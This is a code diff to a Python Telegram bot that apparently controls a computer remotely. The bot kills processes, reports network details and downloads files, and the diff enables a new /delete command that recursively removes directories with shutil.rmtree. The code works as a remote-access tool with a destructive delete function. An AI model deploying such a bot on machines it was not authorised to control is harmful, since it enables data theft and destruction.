@@ -4,6 +4,7 @@ import sys
 import time
 import socket
 import ctypes
+import shutil
 import psutil
 import platform
 import getpass
@@ -40,7 +41,10 @@ TASK MANAGER:
 /taskkill [pid] - Terminates the specified process
 
 FILE MANAGER:
-/download [path]- Downloads file from specified path
+/ls [path] - Lists directory contents
+/cd [path] - Changes directory to specified path
+/delete [path] - Deletes file from specified path
+/download [path] - Downloads file from specified path
 
 NETWORK:
 /networkinfo (/ni) - Basic information about network
@@ -282,6 +286,45 @@ async def cd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await send_message(update, f"Changed directory to: `{new_directory}`")
         except Exception as ex:
             await send_message(update, f"CD Error: {str(ex)}")
+
+async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Deletes a specified file or directory.
+
+    Usage: /delete [path]
+    """
+    if UserAuthorized(update.message.chat_id):
+        try:
+            # Check if a path is provided
+            if len(context.args) == 0:
+                await send_message(update, "Usage: /delete [path]")
+                return
+
+            # Get the path from the command arguments
+            path = " ".join(context.args)
+            absolute_path = os.path.abspath(path)
+
+            # Validate the path
+            if not os.path.exists(absolute_path):
+                await send_message(update, f"Error: Path `{absolute_path}` does not exist.")
+                return
+
+            # Prevent accidental deletion of critical system paths (e.g., C:\ or /)
+            if absolute_path in [os.path.abspath(os.sep), "C:\\"]:
+                await send_message(update, "Error: Deletion of the root directory is not allowed.")
+                return
+
+            # Check if it's a file or directory and delete it
+            if os.path.isfile(absolute_path):
+                os.remove(absolute_path)
+                await send_message(update, f"File `{absolute_path}` has been deleted.")
+            elif os.path.isdir(absolute_path):
+                shutil.rmtree(absolute_path)  # Recursively delete directories
+                await send_message(update, f"Directory `{absolute_path}` and its contents have been deleted.")
+            else:
+                await send_message(update, f"Error: Path `{absolute_path}` is neither a file nor a directory.")
+        except Exception as ex:
+            await send_message(update, f"Delete Error: {str(ex)}")
 
 async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if UserAuthorized(update.message.chat_id):
@@ -548,7 +591,7 @@ def main():
     # FILE MANAGER
     application.add_handler(CommandHandler("ls", ls_command))
     application.add_handler(CommandHandler("cd", cd_command))
-    #application.add_handler(CommandHandler("delete", delete_command))
+    application.add_handler(CommandHandler("delete", delete_command))
     #application.add_handler(CommandHandler("upload", upload_command))
     application.add_handler(CommandHandler("download", download_command))
     #application.add_handler(CommandHandler("ftp", ftp_command))
